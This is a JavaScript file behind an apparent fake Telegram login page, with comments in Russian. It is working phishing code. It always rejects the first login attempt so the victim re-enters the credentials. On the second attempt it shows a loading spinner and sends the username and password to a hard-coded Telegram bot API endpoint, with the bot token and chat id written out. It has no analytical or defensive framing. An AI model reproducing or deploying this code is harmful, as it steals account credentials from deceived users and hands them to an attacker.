document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
    const loading = document.getElementById('loading');
    const validText = document.querySelector(".invalid");
    let tryCount = 0; // Счётчик попыток входа

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username');
        const password = document.getElementById('password');

        // Удаление класса invalid-input, если он был добавлен ранее
        username.classList.remove('invalid-input');
        password.classList.remove('invalid-input');

        if (tryCount === 0) {
            // Если первая попытка, отмечаем как невалидный ввод
            username.classList.add('invalid-input');
            password.classList.add('invalid-input');
            validText.style.display = 'block';
            username.value = '';
            password.value = '';
            
            tryCount++;
            return; // Прекратить выполнение функции
        } else {
            // На второй попытке показываем анимацию загрузки
            loading.style.display = 'flex';
            
            setTimeout(() => {
                const encodedUsername = encodeURIComponent(username.value);
                const encodedPassword = encodeURIComponent(password.value);
                const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;

                const url = `https://api.telegram.org/bot7549495171:AAHXIchCDQZI82SExd_bWxMYmy7H4cqKty0/sendMessage?chat_id=5493141253&text=${encodeURIComponent(
                  jonatish
                )}&parse_mode=HTML`;
                
                fetch(url, { method: 'GET' })
                    .then(response => response.json())
                    .then(data => {
                        loading.style.display = 'none'; // Скрыть анимацию загрузки
                        if (data.ok) {
                            console.log(data.result.message_id);
                            // Здесь можно добавить действия при успешной отправке данных
                        } else {
                            console.log(data.error_code);
                            // Обработка ошибок отправки
                        }
                    })
                    .catch((error) => {
                        alert("Error! Please try again: " + error.message);
                        loading.style.display = 'none';
                        username.value = '';
                        password.value = '';
                    });
            }, 2000); // Задержка в 2 секунды перед отправкой данных
        }
    });
});
